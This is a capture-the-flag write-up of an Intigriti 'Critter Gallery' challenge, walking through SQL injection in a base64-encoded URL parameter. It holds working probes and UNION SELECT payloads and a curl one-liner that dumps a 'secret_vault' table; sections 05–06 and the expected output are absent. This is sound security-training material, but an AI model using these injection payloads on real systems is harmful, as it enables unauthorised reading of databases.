01 Reconnaissance

The challenge is a "Critter Gallery" — a grid of animal emoji cards. Clicking a card navigates to a detail view at challenge.php?pic=<base64>. The base64 decodes to the animal's name: Zm94 → fox, cGFuZGE= → panda, and so on.

The detail card renders three things from the decoded name:

02 The Case-Sensitivity Clue

Testing the parameter with different casing reveals a normalisation differential — the key observation that unlocks the entire challenge:

pic decodes toEmojiDescription
fox🦊 (fox)Fox's description
FOX🖼 (default)Fox's description
Fox🖼 (default)Fox's description

Insight: The emoji lookup is case-sensitive (application code, likely an array map). The description lookup is case-insensitive — the hallmark of a MySQL utf8mb4_..._ci collation. Two different backends means the description is resolved by a SQL query.

03 Confirming SQL Injection

Breaking the query

A single quote (') in the decoded name returns HTTP 200 with a zero-byte body — an uncaught database exception, not an input-validation rejection.

Error probe
# pic = base64("'") → Jw==
curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}\n" \
  "https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Jw%3D%3D"
# → code=200 size=0

Boolean differential

Injecting a tautology vs. a contradiction controls whether the row is returned.

True condition — description returned
fox' AND '1'='1
Fig 2 AND '1'='1 → description returned
False condition — no results
fox' AND '1'='2
Fig 3 AND '1'='2 → "No critter goes by that name yet."

The underlying query is now clear:

SELECT description FROM animals WHERE name = '{user input}'

04 UNION Exploitation

Since the query projects one column, a UNION SELECT with a single value appends an attacker-controlled row to the result set.

UNION proof-of-concept
fox' UNION SELECT 'INJECTED-BY-UNION'
Fig 4 UNION proof — attacker-controlled string rendered in the description panel

Impact confirmed: Arbitrary data from any accessible table can be read through this single-column UNION channel.

07 Technical Notes

Single-column constraint

The query projects exactly one column. A UNION SELECT '1','2' errors out, so every payload must project a single value. GROUP_CONCAT() collapses multiple rows and columns into one string to fit this constraint.

Comment syntax

MySQL requires whitespace after the -- comment introducer. A bare fox'-- produces the zero-byte error. The payloads use -- - (dash-dash-space-dash) to ensure proper termination. # also works.

No XSS

The description is emitted through nl2br(htmlspecialchars(...)). Injecting <img src=x onerror=alert(1)> via UNION returns the HTML-escaped version. The flag lives in the database, so script execution is neither required nor possible here.

Base64 encoding pitfall

PHP's base64_decode is non-strict. The + and = characters in base64 output must be URL-encoded as %2B / %3D or the browser mangles them into spaces, breaking the decoded payload.

08 Reproduction

Copy-paste one-liner that extracts the flag from a terminal:

curl -s "https://challenge-0926.challenges.intigriti.io/challenge.php?pic=$(
  printf "%s" "x' UNION SELECT note FROM secret_vault-- -" | base64 -w0
)" | grep -oP '(?<=class="desc">).*?(?=<)'

Expected output:
